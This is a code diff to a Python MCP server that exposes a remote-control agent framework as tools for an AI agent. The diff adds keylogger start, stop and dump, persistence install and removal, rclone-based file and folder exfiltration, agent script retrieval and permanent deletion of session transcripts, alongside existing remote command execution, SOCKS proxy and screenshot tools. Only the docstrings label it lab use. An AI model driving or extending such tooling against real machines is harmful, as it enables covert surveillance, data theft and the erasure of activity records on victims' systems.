@@ -33,11 +33,18 @@ from mcp.server.fastmcp import FastMCP
 
 from rmm_tools import (
     make_client,
+    tool_delete_history,
     tool_exec_command,
+    tool_get_agent_script,
     tool_get_events,
+    tool_get_history_events,
+    tool_get_history_session,
     tool_get_session,
     tool_health,
+    tool_install_persistence,
     tool_kill_session,
+    tool_list_history,
+    tool_list_session_downloads,
     tool_list_socks,
     tool_list_sessions,
     tool_patch_config,
@@ -45,9 +52,11 @@ from rmm_tools import (
     tool_queue_download,
     tool_queue_exfil,
     tool_get_rclone_config,
+    tool_queue_keylog,
     tool_queue_persistent,
     tool_queue_screenshot,
     tool_queue_upload,
+    tool_remove_persistence,
     tool_start_socks,
     tool_stop_persistent,
     tool_stop_socks,
@@ -139,7 +148,7 @@ def queue_exfil(
     profile: str | None = None,
     dest: str | None = None,
 ) -> str:
-    """Queue remote file exfil via rclone from the agent (link in events when supported)."""
+    """Queue remote file or folder exfil via rclone from the agent (link in events when supported)."""
     return tool_queue_exfil(_client(), session_ref, remote_path, profile, dest)
 
 
@@ -189,6 +198,60 @@ def queue_persistent(session_ref: str, command: str) -> str:
 def stop_persistent(session_ref: str) -> str:
     """Stop the agent persistent command."""
     return tool_stop_persistent(_client(), session_ref)
+
+
+@mcp.tool()
+def list_history() -> str:
+    """List archived (ended) session transcripts."""
+    return tool_list_history(_client())
+
+
+@mcp.tool()
+def get_history_session(session_ref: str) -> str:
+    """Get metadata for an archived session by id prefix, full id, or hostname."""
+    return tool_get_history_session(_client(), session_ref)
+
+
+@mcp.tool()
+def get_history_events(session_ref: str, since: int = 0, limit: int = 500) -> str:
+    """Fetch read-only event transcript for an archived session."""
+    return tool_get_history_events(_client(), session_ref, since=since, limit=limit)
+
+
+@mcp.tool()
+def delete_history(session_ref: str) -> str:
+    """Permanently delete an archived session transcript (ended sessions only)."""
+    return tool_delete_history(_client(), session_ref)
+
+
+@mcp.tool()
+def list_session_downloads(session_ref: str) -> str:
+    """List files downloaded from the agent for a live session."""
+    return tool_list_session_downloads(_client(), session_ref)
+
+
+@mcp.tool()
+def get_agent_script() -> str:
+    """Fetch the full client_rmm.ps1 agent script from the server."""
+    return tool_get_agent_script(_client())
+
+
+@mcp.tool()
+def queue_keylog(session_ref: str, action: str) -> str:
+    """Queue keylogger start, stop, or dump on the agent."""
+    return tool_queue_keylog(_client(), session_ref, action)
+
+
+@mcp.tool()
+def install_persistence(session_ref: str) -> str:
+    """Queue agent persistence install (lab use only)."""
+    return tool_install_persistence(_client(), session_ref)
+
+
+@mcp.tool()
+def remove_persistence(session_ref: str) -> str:
+    """Queue agent persistence removal (lab use only)."""
+    return tool_remove_persistence(_client(), session_ref)
 
 
 if __name__ == "__main__":
